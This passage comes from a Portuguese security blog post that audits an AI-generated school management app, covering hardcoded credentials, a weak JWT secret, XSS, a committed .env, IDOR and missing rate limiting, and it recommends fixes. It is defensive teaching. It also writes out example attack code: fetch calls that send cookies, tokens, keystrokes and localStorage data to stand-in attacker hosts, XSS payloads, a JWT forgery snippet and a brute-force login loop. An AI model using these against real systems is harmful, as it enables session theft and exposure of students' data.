  <p className="font-medium text-center">Usuários para teste:</p>
  <div className="grid grid-cols-2 gap-2">
    <div className="border rounded-md p-2">
      <p className="font-semibold">Administrador:</p>
      <p>Usuário: admin</p>
      <p>Senha: admin</p>
    </div>
    {/* ... professor, aluno, responsável */}
  </div>
</div>
```

A tela de login literalmente mostra: "Quer entrar como admin? Usa admin/admin!"

Isso é o tipo de coisa que faz sentido durante desenvolvimento, num ambiente local, pra facilitar testes. Mas nunca, em hipótese alguma, deveria ir pra produção. É como deixar um post-it na porta dizendo "a chave tá embaixo do tapete".

A IA não tem a noção de "isso é código de desenvolvimento" vs "isso vai pra produção". Ela gerou algo que funciona e facilita o uso - sem pensar que esse "facilitar" é exatamente o que um atacante precisa.

Com toda certeza isso foi feito para desenvolvimento e como é algo visual facilmente seria retirado pelo usuário a partir de um prompt... mas e se acabar ficando como um comentário na página? Não seria nada novo... quem lembra dos casos de credenciais comentadas no código do Ministério da Saúde em plena pandemia?

Enfim, por mais que possamos desconsiderar essa parte por ser algo que não iria para o servido de produção de verdade, eu quis colocar aqui pois teria o risco de acabar acontecendo com quem não tem o mínimo de informação de desenvolvimento e quer ganhar dinheiro com seu micro-SaaS.

---

### O JWT que todo mundo conhece

Continuando no tema de autenticação, olha só o que encontrei no `src/services/auth.service.ts`:

```typescript
private static generateToken(userId: string, role: string): string {
  return jwt.sign(
    { userId, role },
    process.env.JWT_SECRET || 'default_secret',
    { expiresIn: '24h' }
  );
}
```

JWT (JSON Web Token) é uma forma comum de autenticação em APIs modernas. A ideia é que o servidor gera um "token" assinado com uma chave secreta. Quando o usuário faz requisições, envia esse token, e o servidor verifica se a assinatura bate com a chave secreta.

O problema? A chave precisa ser... secreta.

Primeiro, tem aquele `|| 'default_secret'`. Isso é um fallback - se a variável de ambiente não existir, usa "default_secret". Parece inofensivo, mas em produção, se alguém esquecer de configurar a variável, o sistema roda com uma chave que **literalmente todo desenvolvedor do mundo conhece**.

Segundo, fui olhar o `.env` do projeto:

```bash
JWT_SECRET="escola_em_foco_secret_key_2024"
```

Uma chave "secreta" que:
- Contém o nome do projeto
- Contém o ano
- É totalmente previsível

Com essa chave, qualquer pessoa pode forjar tokens JWT válidos:

```javascript
const jwt = require('jsonwebtoken');

// Criar um token fake de administrador
const tokenFalso = jwt.sign(
  { userId: '1', role: 'ADMIN' },
  'escola_em_foco_secret_key_2024',
  { expiresIn: '24h' }
);

// Usar esse token pra acessar qualquer endpoint protegido
// O sistema vai aceitar como se fosse legítimo
```

E lembra que falamos da vulnerabilidade do Vite que permite ler o `.env`? Pois é. Mesmo que a chave fosse boa, ela poderia ser vazada por aquele path traversal.

Nesse caso não tem como passar pano, o último tópico do login a gente até consegue desconsiderar, mas nesse caso aqui a chance de passar assim para produção é grande... lembre que estamos lidando com pessoas que não são desenvolvedoras, são pessoas que tem um prompt e um sonho.

---

### As senhas que qualquer um sabe

Ainda no `auth.service.ts`, tem uma função de seed (popular o banco com dados iniciais):

```typescript
static async seedInitialUsers() {
  const users = [
    {
      email: 'admin@escola.com',
      password: 'admin',
      name: 'Administrador',
      role: 'ADMIN',
    },
    {
      email: 'professoras@escola.com',
      password: 'professoras',
      name: 'Professora',
      role: 'TEACHER',
    },
    {
      email: 'responsavel@escola.com',
      password: 'responsavel',
      name: 'Responsável',
      role: 'PARENT',
    },
    {
      email: 'aluno@escola.com',
      password: 'aluno',
      name: 'Aluno',
      role: 'STUDENT',
    },
  ];
  // ...
}
```

Olha a criatividade nas senhas: a do admin é "admin", a do professor é "professoras", a do aluno é "aluno". Essas credenciais estão **escritas no código fonte**. Qualquer pessoa que clonar o repositório, ou que tenha acesso ao código, sabe exatamente como entrar no sistema.

"Mas Matheus, é só pra desenvolvimento!" Pode ser. Mas e se esse seed rodar em produção? E se alguém fizer deploy sem limpar esses usuários? E se em outro projeto a pessoa copiar essa lógica achando que tá certo?

O código de seed deveria, no mínimo:
- Usar variáveis de ambiente para as senhas iniciais
- Forçar troca de senha no primeiro login
- Ou simplesmente não existir em produção

---

### Upload de Imagens: A Porta dos Fundos

Aqui entra uma vulnerabilidade que o Dependabot não detectou, mas que é grave. O código de upload de imagem aparece em pelo menos dois lugares do sistema: configurações da escola (logo) e perfil do usuário (foto de perfil). A lógica é praticamente idêntica nos dois. Olha o componente de configurações em `src/components/admin/SchoolSettingsTab.tsx`:

```typescript
<input
  type="file"
  accept="image/*"
  className="hidden"
  id="logoUpload"
  onChange={(e) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (event) => {
        if (event.target?.result) {
          onSettingsChange({...settings, logo: event.target.result as string});
        }
      };
      reader.readAsDataURL(file);
    }
  }}
/>
```

E no gerador de PDF (`src/utils/pdfGenerator.ts`), esses dados são usados assim:

```typescript
const schoolLogo = localStorage.getItem('schoolLogo') || '/placeholder.svg';

container.innerHTML = `
  <div style="text-align: center; margin-bottom: 20px;">
    ${showLogo ? `<img src="${schoolLogo}" alt="Logo da escola" ...>` : ''}
    ${showName ? `<h1 ...>${schoolName}</h1>` : ''}
    <h3 ...>${studentData.name}</h3>
  </div>
`;
```

Vários problemas aqui:

**1. Nenhuma validação do arquivo enviado**

O `accept="image/*"` é só uma sugestão pro browser - não é uma validação de verdade. Um atacante pode enviar qualquer coisa. Não tem verificação de:
- Tipo real do arquivo (magic bytes)
- Tamanho máximo
- Dimensões da imagem
- Conteúdo malicioso

**2. Dados vão direto pro innerHTML sem sanitização**

Quando você faz `container.innerHTML = "..."` com dados que vieram do usuário, está convidando XSS (Cross-Site Scripting) pra festa. O `schoolLogo`, `schoolName` e até `studentData.name` são inseridos diretamente no HTML.

**Esclarecimento técnico:** Quando falamos de "injetar código via imagem", não é que a imagem em si executa código. O que acontece é que o campo que deveria conter uma URL de imagem (tipo `data:image/png;base64,...`) pode ser substituído por um payload como `"><script>alert('xss')</script>` ou `javascript:alert('xss')`. Como esse valor vai direto pro `innerHTML` sem sanitização, o browser interpreta como HTML/JavaScript. É um XSS clássico - a "imagem" é só o vetor de entrada.

**3. A logo fica no localStorage - e aparece em TODO lugar**

Aqui mora um detalhe importante: a logo da escola não aparece só nos PDFs. Ela fica no **menu superior do site**, visível em todas as páginas pra todos os usuários logados. Isso significa que um payload XSS na logo seria executado:

- Toda vez que qualquer usuário acessar qualquer página do sistema (via menu)
- Toda vez que alguém gerar qualquer PDF (boletim, matrícula, presença...)

Por isso a logo é um alvo muito mais valioso que a foto de perfil. A foto de perfil de um aluno só seria renderizada em contextos específicos (listagem, perfil individual), mas a logo está **sempre presente**. É a diferença entre contaminar uma torneira específica e contaminar a caixa d'água do prédio.

**4. Múltiplos vetores de ataque**

Aqui é onde fica interessante: o upload da logo da escola é restrito a admins. MAS lembra das vulnerabilidades que vimos antes?

- **Prototype Pollution do js-yaml**: Se explorada, pode fazer `user.isAdmin = true` pra todo mundo
- **JWT com secret previsível**: Dá pra forjar um token de admin
- **localStorage manipulável**: Se conseguir XSS em qualquer lugar, pode alterar o role do usuário

Ou seja: mesmo que o upload de logo seja "só pra admin", as outras vulnerabilidades permitem **escalar privilégios** e chegar lá. E pior: o upload de foto de perfil usa a mesma lógica sem validação - e esse qualquer usuário logado pode fazer.

É aquela história de "defesa em profundidade": se você só protege uma camada, quando ela cai, não sobra nada.

**Cenário de ataque combinado (via logo):**

1. Atacante cria conta normal de aluno
2. Explora uma das vulnerabilidades de elevação de privilégio (JWT, Prototype Pollution, localStorage)
3. Agora é "admin" e pode alterar a logo da escola
4. Coloca um payload XSS como logo
5. **Todo usuário que acessar qualquer página do sistema executa o código** (a logo está no menu)
6. Bônus: quem gerar PDFs também é afetado

Por que a logo é o alvo ideal? Porque maximiza o alcance. A foto de perfil de um aluno específico só seria carregada em contextos limitados - mas a logo está em **todas as páginas**, **pra todos os usuários**, **o tempo todo**.

**Cenário alternativo (via foto de perfil):**

1. Atacante cria conta normal
2. Altera a própria foto de perfil com payload malicioso
3. Qualquer funcionalidade que renderize essa foto executa o código

Mesmo sem escalar privilégios, esse cenário é perigoso. A foto de perfil do atacante seria carregada em:

- **Listagem de alunos** - quando um professor ou admin visualiza a turma
- **Ambiente de presença** - onde as fotos dos alunos aparecem para marcar presença
- **Geração de PDFs** - boletins, fichas de matrícula ou qualquer documento que inclua foto do aluno
- **Página de perfil** - quando alguém clica pra ver os dados do aluno

Aqui entra a **engenharia social**: o atacante não precisa invadir nada. Basta enviar um link legítimo da plataforma pra alguém. "Professor, pode verificar meus dados? Acho que tem algo errado no meu perfil: [link legítimo pro perfil do atacante]". O professor clica, o payload executa. O link é do próprio sistema - não levanta suspeitas.

Ou pior: "Preciso do meu boletim, pode gerar pra mim?". O admin gera o PDF do aluno atacante, e o payload executa no browser do admin.

É um ataque mais direcionado que a logo (que pega todo mundo), mas potencialmente mais efetivo porque usa a própria plataforma como vetor de entrega - zero red flags pra vítima.

O mais irônico? A vulnerabilidade do jsPDF que o Dependabot encontrou (CVE-2025-57810) também envolve imagens PNG maliciosas. Ou seja, além de poder injetar scripts via XSS, um atacante poderia enviar um PNG especialmente crafted que trava o browser de qualquer pessoa que tentar gerar um PDF - são vetores diferentes, mas que se complementam.

---

### XSS: A vulnerabilidade que nunca morre

Já que tocamos no assunto de XSS várias vezes, vale aprofundar porque essa é uma das vulnerabilidades mais comuns e mais perigosas da web.

**O que é XSS?**

Cross-Site Scripting (XSS) acontece quando um atacante consegue injetar código JavaScript malicioso em uma página web que outros usuários vão acessar. É "cross-site" porque o código vem de fora (do atacante), mas executa como se fosse do site legítimo.

Existem três tipos principais:

1. **Stored XSS (Persistido)**: O código malicioso fica salvo no banco de dados. Toda vez que alguém acessa aquela página, o código executa. É o caso da foto de perfil ou nome com payload.

2. **Reflected XSS (Refletido)**: O código vem na URL e é "refletido" de volta na página. Atacante manda um link malicioso pra vítima.

3. **DOM-based XSS**: O código manipula o DOM diretamente no browser, sem passar pelo servidor.

**Por que XSS é tão grave?**

Quando seu JavaScript roda no navegador de outra pessoa, você pode:

```javascript
// Roubar cookies de sessão
fetch('https://hacker.com/steal?cookie=' + document.cookie);

// Roubar tokens de autenticação
fetch('https://hacker.com/steal?token=' + localStorage.getItem('token'));

// Modificar a página (phishing)
document.body.innerHTML = '<h1>Sessão expirada</h1><form action="https://hacker.com/phish"><input name="senha" placeholder="Digite sua senha"></form>';

// Fazer requisições como se fosse o usuário
fetch('/api/transferir-dinheiro', {
  method: 'POST',
  body: JSON.stringify({ para: 'hacker', valor: 10000 })
});

// Keylogger - capturar tudo que o usuário digita
document.addEventListener('keypress', (e) => {
  fetch('https://hacker.com/keys?key=' + e.key);
});
```

**No contexto do Escola em Foco:**

O projeto tem múltiplos pontos vulneráveis a XSS:

1. **innerHTML no pdfGenerator.ts**: Qualquer campo que vá pro PDF pode conter payload
2. **Foto de perfil**: Não tem validação nem sanitização
3. **Nome de aluno/professor**: Vai direto pro HTML
4. **Configurações da escola**: Nome, logo, todos os campos

Um atacante poderia:
- Roubar sessões de professores pra acessar notas
- Modificar notas de alunos
- Acessar dados sensíveis de menores de idade
- Criar backdoors persistentes no sistema

**Como prevenir XSS:**

```javascript
// ERRADO - vulnerável a XSS
container.innerHTML = `<h1>${userName}</h1>`;

// CERTO - usar textContent quando não precisa de HTML
element.textContent = userName;

// CERTO - usar bibliotecas de sanitização quando precisa de HTML
import DOMPurify from 'dompurify';
container.innerHTML = DOMPurify.sanitize(htmlContent);

// CERTO - usar frameworks que escapam automaticamente (React faz isso)
// Mas cuidado com dangerouslySetInnerHTML!
```

A proteção correta para os uploads envolveria:
- Validar o tipo real do arquivo no backend (magic bytes)
- Limitar tamanho e dimensões
- Reprocessar a imagem (redimensionar, reconverter) pra remover payloads
- Sanitizar TODOS os dados antes de inserir em HTML
- Usar Content Security Policy (CSP) como camada extra de defesa
- Implementar bibliotecas de sanitização como DOMPurify

---

### Content Security Policy (CSP): A Defesa que muitos não configuram

Já que mencionei CSP como "camada extra de defesa", vale explicar o que é - porque é uma das proteções mais poderosas contra XSS, e quase ninguém usa.

**O que é CSP?**

Content Security Policy é um header HTTP que diz ao navegador: "só execute scripts/carregue recursos dessas fontes específicas". É como uma lista de convidados pra uma festa - se não tá na lista, não entra.

**Como funciona na prática:**

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com; style-src 'self' 'unsafe-inline'
```

Isso diz:
- `default-src 'self'`: Por padrão, só carregue recursos do próprio domínio
- `script-src 'self' https://cdn.trusted.com`: Scripts só do próprio site ou do CDN confiável
- `style-src 'self' 'unsafe-inline'`: Estilos do site ou inline (necessário pra alguns frameworks)

**Por que isso bloqueia XSS?**

Se um atacante conseguir injetar `<script>alert('xss')</script>` na página, o navegador olha pro CSP e diz: "esse script não tá na lista de fontes permitidas" - e **não executa**.

Mesmo que o XSS esteja lá no HTML, ele não roda. É uma segunda linha de defesa crucial.

**No projeto Escola em Foco:**

Não existe CSP configurado. Nenhum header de segurança. O navegador aceita qualquer script de qualquer lugar.

**Como implementar:**

```javascript
// No Express/Node.js - usando helmet
import helmet from 'helmet';

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'"],
  },
}));
```

---

### CORS: Outra configuração esquecida

**CORS** (Cross-Origin Resource Sharing) controla quais domínios podem fazer requisições pra sua API. É outra configuração de segurança que projetos vibe coded geralmente ignoram ou configuram errado.

**O problema comum:**

```javascript
// Configuração "preguicosa" que vejo o tempo todo
app.use(cors({ origin: '*' }));  // PERMITE QUALQUER SITE!
```

Isso significa que qualquer site na internet pode fazer requisições pra sua API. Um atacante poderia criar uma página maliciosa que, quando a vítima acessa, faz requisições pra sua API usando as credenciais/cookies da vítima.

**Configuração correta:**

```javascript
// Especificar exatamente quais origens são permitidas
app.use(cors({
  origin: ['https://meusite.com', 'https://app.meusite.com'],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
}));
```

No projeto analisado? Nem vi configuração de CORS. A IA simplesmente não pensou nisso.

---

### O .env que Foi pro Git

Essa é talvez a mais básica de todas, e mostra bem como a IA não pensa em segurança.

Fui olhar o `.gitignore` do projeto. Sabe o que **não** está lá?

O `.env`.

```bash
# O .gitignore do projeto lista:
node_modules
dist
dist-ssr
*.local
# ... várias coisas
# Mas NÃO lista .env
```

E o `.env` do projeto contém:

```bash
DATABASE_URL="postgresql://postgres:gta123@localhost:5432/escola_em_foco"
JWT_SECRET="escola_em_foco_secret_key_2024"
```

Ou seja: a senha do banco de dados (**gta123** - sim, referência a GTA mesmo) e a chave JWT estão **commitadas no repositório**. Qualquer pessoa com acesso ao repo - seja público ou privado com acesso compartilhado - tem todas as credenciais.

Se o projeto for open source? Game over. Se alguém clonar pra "estudar"? Tem as credenciais. Se for vendido ou transferido? As credenciais antigas continuam no histórico do Git.

Isso é coisa que qualquer dev aprende na primeira semana de trabalho: **nunca commite o .env**. Mas a IA não sabe disso - ou não se importa.

A correção é simples: adicionar `.env` no `.gitignore`. Mas se já foi commitado, o estrago já foi feito. O histórico do Git guarda tudo. Você precisaria reescrever o histórico (com `git filter-branch` ou BFG Repo-Cleaner) ou simplesmente trocar todas as credenciais.

**Como deveria ser um .env seguro:**

```bash
# .env.example (esse sim vai pro Git, como referência)
DATABASE_URL="sua_connection_string_aqui"
JWT_SECRET="gere_uma_chave_aleatoria"

# .env (esse NUNCA vai pro Git)
# Gerar JWT_SECRET seguro:
# node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
# Resultado: uma string de 128 caracteres aleatórios

DATABASE_URL="postgresql://user:SENHA_FORTE_AQUI@host:5432/db?sslmode=require"
JWT_SECRET="a3f8b2c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1"
```

A diferença? A chave segura tem 128 caracteres aleatórios gerados criptograficamente. Isso levaria bilhões de anos pra ser quebrado por força bruta. Já "escola_em_foco_secret_key_2024" pode ser adivinhado em segundos.

---

### localStorage: O cofre sem fechadura

Falei brevemente sobre localStorage, mas vale aprofundar porque é um padrão que a IA adora usar - e que é perigoso.

No `AuthContext.tsx`:

```typescript
localStorage.setItem('user', JSON.stringify(foundUser));
```

No `pdfGenerator.ts`:

```typescript
const schoolName = localStorage.getItem('schoolName') || 'Escola Demo';
const schoolLogo = localStorage.getItem('schoolLogo') || '/placeholder.svg';
```

E não é só isso. Olhando os outros services, encontrei que **notas, turmas, avaliações** - tudo vai pro localStorage:

```typescript
// assessment.service.ts
localStorage.setItem('assessments', JSON.stringify(assessments));
localStorage.setItem('grades', JSON.stringify(grades));

// class.service.ts  
localStorage.setItem('classes', JSON.stringify(classes));
localStorage.setItem('students', JSON.stringify(students));
```

localStorage é uma API do browser que permite guardar dados persistentes. O problema é que **qualquer JavaScript rodando na página tem acesso total ao localStorage**. Se existir uma vulnerabilidade de XSS em qualquer lugar do sistema (e existe), o atacante pode:

```javascript
// Roubar todos os dados do usuário
const dadosRoubados = {
  user: JSON.parse(localStorage.getItem('user')),
  notas: JSON.parse(localStorage.getItem('grades')),
  turmas: JSON.parse(localStorage.getItem('classes')),
  alunos: JSON.parse(localStorage.getItem('students')),
};

// Enviar pro servidor do atacante
fetch('https://servidor-malicioso.com/coletar', {
  method: 'POST',
  body: JSON.stringify(dadosRoubados)
});

// Ou modificar dados pra escalar privilégios
const user = JSON.parse(localStorage.getItem('user'));
user.role = 'ADMIN';
localStorage.setItem('user', JSON.stringify(user));
// Se o frontend confia no localStorage, agora sou admin
```

A alternativa mais segura para tokens de autenticação é usar **cookies HttpOnly** - que não podem ser acessados por JavaScript. Para dados sensíveis, usar sempre o backend com autenticação apropriada.

---

### A Validação que não existe

Percorri o código todo procurando validações. Sabe o que encontrei? Praticamente nada.

No login:

```typescript
const login = async (email: string, password: string): Promise<boolean> => {
  const foundUser = MOCK_USERS.find(u => u.email === email);
  // ...
};
```

Não valida se o email tem formato de email. Não valida tamanho. Não valida caracteres especiais. Não tem rate limiting. Não tem CAPTCHA. Um atacante pode:

- Testar milhares de combinações por segundo (brute force)
- Enviar payloads gigantes pra tentar estourar memória
- Injetar caracteres especiais pra ver se quebra algo

Nos formulários de cadastro de alunos, turmas e avaliações é a mesma coisa: os dados vão direto pro banco sem validação.

Isso é especialmente grave em sistemas que usam Prisma ORM. O Prisma geralmente protege contra SQL Injection básico, mas existem casos onde você pode usar `$queryRaw` ou `$executeRaw` pra queries customizadas. Se algum desenvolvedor futuro adicionar isso sem saber dos riscos, e os inputs não estiverem validados... boom.

---

### Rate Limiting: A proteção inexistente

Mencionei "sem rate limiting" várias vezes, mas nunca expliquei o que é. Então vamos lá.

**Rate limiting** é uma técnica pra limitar quantas requisições um usuário pode fazer em um período de tempo. É como aquele aviso "você já tentou muitas vezes, aguarde 5 minutos" que você vê em alguns sites.

**Por que isso importa?**

Sem rate limiting, um atacante pode:
- **Brute force de senhas**: Testar milhões de combinações de usuário/senha automaticamente
- **Enumeração de usuários**: Descobrir quais emails estão cadastrados ("email não encontrado" vs "senha incorreta")
- **DoS**: Sobrecarregar o servidor com requisições
- **Scraping**: Extrair todos os dados do sistema automaticamente

**No projeto Escola em Foco:**

Não existe nenhum tipo de rate limiting. Zero. Nada. Um script simples poderia testar todas as combinações possíveis de credenciais em minutos:

```python
# Atacante poderia fazer isso sem nenhuma restrição
import requests

for senha in ['admin', '123456', 'password', 'escola', ...]:
    r = requests.post('https://sistema.com/login', 
                      json={'email': 'admin', 'password': senha})
    if r.status_code == 200:
        print(f'Senha encontrada: {senha}')
        break
# Sem rate limiting, isso roda em milissegundos por tentativa
```

**Como implementar (Node.js/Express):**

```javascript
// Usando express-rate-limit
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutos
  max: 5, // Máximo 5 tentativas por IP
  message: 'Muitas tentativas de login. Tente novamente em 15 minutos.',
  standardHeaders: true,
  legacyHeaders: false,
});

app.post('/login', loginLimiter, loginController);
```

Mas a IA não gerou isso. E quem tá no vibe coding não sabe que precisa.

---

### IDs Previsíveis, IDOR e BOLA

Uma vulnerabilidade mais sutil, mas que merece menção especial. Em vários lugares do código, os IDs são gerados assim:

```typescript
// attendance.service.ts
id: `attendance-${Date.now()}-${Math.random()}`,

// class.service.ts
id: `class-${Date.now()}`,
```

O problema? `Date.now()` retorna o timestamp em milissegundos - se eu sei aproximadamente quando um registro foi criado, posso chutar o ID. E `Math.random()` não é criptograficamente seguro - ele usa um algoritmo previsível.

**O que é IDOR/BOLA?**

**IDOR** (Insecure Direct Object Reference) e **BOLA** (Broken Object Level Authorization) são vulnerabilidades que acontecem quando um sistema não verifica se o usuário tem permissão pra acessar um recurso específico. Estão na **OWASP API Security Top 10** como a vulnerabilidade #1.

O padrão é simples: se a URL do boletim de um aluno é `/boletim/student-1702859234567`, o que acontece se eu mudar pra `/boletim/student-1702859234568`? Se o sistema não verificar se eu tenho permissão pra ver aquele aluno específico, consigo acessar dados de qualquer pessoa.

**No projeto Escola em Foco:**

Durante os testes práticos na época do desenvolvimento, identifiquei que os links de PDFs gerados (boletins, fichas de matrícula) usavam esses IDs previsíveis. Como não há verificação de autorização no nível do objeto - o sistema só verifica se você está logado, não se aquele recurso específico pertence a você - é possível enumerar e acessar documentos de outros alunos.

```
# URL legítima do meu boletim
/api/boletim/student-1702859234567

# Testando outros IDs (IDOR)
/api/boletim/student-1702859234566  ← Boletim de outro aluno!
/api/boletim/student-1702859234565  ← Mais um!
```

**Por que isso importa?**

Se os IDs são usados em URLs ou permissões (tipo `/class/class-1702859234567`), um atacante pode:
- Enumerar recursos (testar IDs sequenciais/próximos)
- Acessar registros que não deveria (IDOR/BOLA)
- Baixar documentos sensíveis de outros usuários
- Em alguns casos, prever IDs futuros e interceptar dados

**A correção envolve duas partes:**
1. Usar UUIDs v4 (que o Prisma já usa no banco) ou `crypto.randomUUID()` para IDs - isso dificulta enumeração
2. **Mais importante:** Implementar verificação de autorização em cada requisição - verificar se o usuário logado tem permissão para acessar aquele recurso específico

---

### Logs e Monitoramento: Você nem sabe que foi atacado

Uma ausência crítica que ninguém percebe até ser tarde demais: **logging de segurança**.

O projeto Escola em Foco não tem nenhum sistema de logs estruturados. Isso significa que:

- Se alguém tentar brute force no login, você não sabe
- Se alguém explorar IDOR pra baixar boletins de outros alunos, você não sabe
- Se alguém injetar XSS, você não sabe
- Se houver um vazamento de dados, você só descobre quando aparecer no Reclame Aqui

**O que deveria ser logado:**

```javascript
// Eventos de segurança que PRECISAM ser logados
- Tentativas de login (sucesso e falha)
- Alterações de senha/permissões
- Acesso a recursos sensíveis (boletins, dados de alunos)
- Erros de autorização (tentativa de acessar algo sem permissão)
- Uploads de arquivos
- Alterações em configurações do sistema
```

**Ferramentas que poderiam ajudar:**

- **Sentry** - Captura erros e exceptions automaticamente
- **LogRocket/FullStory** - Grava sessões de usuário (cuidado com privacidade)
- **Winston/Pino** - Bibliotecas de logging estruturado pra Node.js
- **Datadog/New Relic** - Monitoramento completo de aplicações

Sem logs, você está voando às cegas. Quando perceber que foi atacado, os dados já vazaram, e você não tem como investigar o que aconteceu. Na hora de prestar contas pra ANPD (lembra da LGPD?), você não vai ter nada pra mostrar.

---

## Afinal, por que a IA gera Código tão Inseguro?

Você deve estar se perguntando: "se a IA é tão inteligente, por que erra tanto em segurança?"

A resposta é mais simples do que parece: a IA foi treinada em código público da internet. E vamos ser honestos, a maior parte do código que está no GitHub, Stack Overflow, tutoriais... é código de exemplo. Código feito pra ensinar conceitos, não pra ir pra produção.

Quando você aprende a fazer login em algum tutorial, o foco é te mostrar o fluxo: pegar email e senha, comparar com o banco, retornar sucesso ou erro. O tutorial não vai te ensinar sobre rate limiting, hashing seguro, JWT rotation, porque isso complicaria o exemplo. Faz sentido, são coisas diferentes.

O problema é que a IA aprendeu com esses exemplos. Ela é excelente em gerar código que **funciona**. Ela é péssima em gerar código que **é seguro em produção**. São objetivos diferentes, e ela foi otimizada pro primeiro.

Além disso, a IA não tem contexto real do seu projeto. Ela não sabe que você vai colocar dados de crianças ali. Ela não sabe que vai rodar na internet aberta. Ela não pensa como um atacante pensaria olhando pro seu sistema. Ela só quer gerar algo que rode sem erros.

### Isso Não é Teoria: Vazamentos Reais Acontecem

Se você acha que estou exagerando, aqui vão alguns casos reais (sem citar nomes específicos) que demonstram o quão comum são falhas em sistemas educacionais:

- **2021**: Sistema de matrícula escolar expõe dados de milhões de alunos por falha de configuração (IDOR)
- **2022**: Plataforma de EAD vaza dados de professores e alunos por API sem autenticação
- **2023**: Aplicativo escolar expõe fotos e endereços de menores por bucket S3 público
- **2024**: Sistema de boletim online permite acesso a notas de qualquer aluno alterando ID na URL

E esses são só os que foram descobertos e reportados. Quantos sistemas vulneráveis estão rodando agora, feitos às pressas com vibe coding, esperando serem explorados?

---

## "Mas e se eu pedir Segurança no Prompt?"

Essa é a pergunta que inevitavelmente surge: "tá, mas e se eu pedir pra IA fazer o código seguro? E se eu mandar prompts específicos pedindo rate limiting, sanitização, autenticação forte?"

É uma pergunta justa. E a resposta honesta é: **ajuda, mas não resolve**.

Vou explicar por quê - e isso é crucial pra entender por que investir em segurança profissional ainda faz sentido mesmo na era da IA.

### O que dá pra melhorar via Prompt

Primeiro, o que funciona. Se você tem conhecimento de segurança, consegue sim melhorar bastante o código gerado via prompts direcionados:

```
"Implemente autenticação usando bcrypt para hash de senhas, 
JWT com secret de 256 bits gerado via crypto.randomBytes, 
rate limiting de 5 tentativas por IP a cada 15 minutos, 
e cookies HttpOnly para os tokens."
```

A IA vai gerar algo melhor que o padrão. Provavelmente vai usar bcrypt, vai gerar um secret mais forte, vai implementar rate limiting. **Isso é real e funciona.**

Mas aqui começam os problemas.

### O problema do "não sei o que não sei"

Pra pedir algo específico no prompt, você precisa **saber que aquilo existe**. E aí mora o paradoxo: se você já sabe o suficiente pra pedir todas as proteções necessárias, você provavelmente já tem capacidade suficiente para programar seguro sem a IA (ao menos agilizar o desenvolvimento com IA um pouco mais seguro).

Entretanto, quem está no dito `vibe coding` geralmente é quem **não tem** tal conhecimento. A pessoa sabe que quer "um sistema de login", mas não que precisa de:

- Rate limiting
- Account lockout após N tentativas
- Proteção contra timing attacks na comparação de senhas
- Session fixation prevention
- Secure cookie flags (HttpOnly, Secure, SameSite)
- CSRF tokens
- Password policy enforcement
- Secure password reset flow
- Multi-factor authentication
- Audit logging de tentativas de login

Isso é só pra **login**... um formulário... agora imagine só o que não precisa para um ambiente/sistema inteiro.

### Vulnerabilidades de Lógica de Negócio

Aqui entra algo que poucos falam: **a maioria das vulnerabilidades críticas não são técnicas - são de lógica de negócio**.

Segundo dados do [HackerOne 2024 Hacker-Powered Security Report](https://www.hackerone.com/resources/reporting/hacker-powered-security-report), aproximadamente **60% das vulnerabilidades reportadas em programas de bug bounty são relacionadas a falhas de lógica de negócio e controle de acesso** - não são SQLi, XSS ou outras vulnerabilidades "clássicas" que ferramentas automatizadas detectam.

O que isso significa na prática? São coisas como:

- Um usuário consegue cancelar a assinatura de outro usuário
- O desconto de 50% pode ser aplicado duas vezes
- O aluno consegue alterar a própria nota antes do professor aprovar
- O limite de crédito pode ser bypassado dividindo a compra em parcelas
- O cupom expirado ainda funciona se você manipular a data no request

Essas vulnerabilidades são **específicas do seu sistema**. A IA não tem como saber que no seu e-commerce o fluxo de pagamento permite bypass, porque ela não conhece seu fluxo de pagamento completo. Ela só vê o pedaço de código que você mostrou ou disponibilizou naquela run.

Nenhum prompt genérico resolve isso. Você precisaria descrever cada regra de negócio e cada caso de borda possível - e nesse ponto, é mais fácil escrever o código você mesmo (Claro que poderia gerar um prompt com tudo e depois analisar).

### Race Conditions e Timing Attacks

Algumas vulnerabilidades são tão sutis que mesmo desenvolvedores experientes erram. Race conditions, por exemplo.

Imagina um sistema de reserva de ingressos:

```javascript
// Código que parece correto
async function reservarIngresso(userId, eventoId) {
  const evento = await db.evento.findUnique({ where: { id: eventoId }});
  
  if (evento.ingressosDisponiveis > 0) {
    await db.evento.update({
      where: { id: eventoId },
      data: { ingressosDisponiveis: evento.ingressosDisponiveis - 1 }
    });
    await db.reserva.create({ data: { userId, eventoId }});
    return { success: true };
  }
  return { success: false, error: 'Esgotado' };
}
```

Parece certo, né? Verifica se tem ingresso, se tiver, decrementa e cria a reserva.

O problema: se 100 pessoas clicarem "comprar" no mesmo milissegundo, todas vão passar no `if`, todas vão decrementar de 1, e você vai vender 100 ingressos quando só tinha 1. É um race condition clássico.

A correção envolve transações com locks otimistas ou pessimistas, operações atômicas, ou filas de processamento. Coisas que a IA não vai implementar a menos que você peça explicitamente - e você só pede se souber que o problema existe.

E timing attacks? Quando o tempo de resposta do servidor revela informações sensíveis? Tipo: "usuário não encontrado" responde em 50ms, mas "senha incorreta" responde em 200ms porque calculou o hash. Um atacante pode enumerar usuários válidos só medindo tempo de resposta. A IA não pensa nisso.

### Configuração de Infraestrutura

O código é só uma parte. Segurança de verdade envolve:

- **WAF (Web Application Firewall)**: Bloqueia padrões de ataque conhecidos
- **Configuração de headers HTTP**: HSTS, X-Frame-Options, X-Content-Type-Options
- **TLS/SSL**: Certificados, cipher suites, versões de protocolo
- **Firewall de rede**: Portas abertas, segmentação
- **Configuração do banco de dados**: Permissões, conexões criptografadas
- **Secrets management**: Vault, AWS Secrets Manager, etc
- **Backup e disaster recovery**: Testar restauração, não só backup
- **Monitoramento e alertas**: SIEM, detecção de anomalias

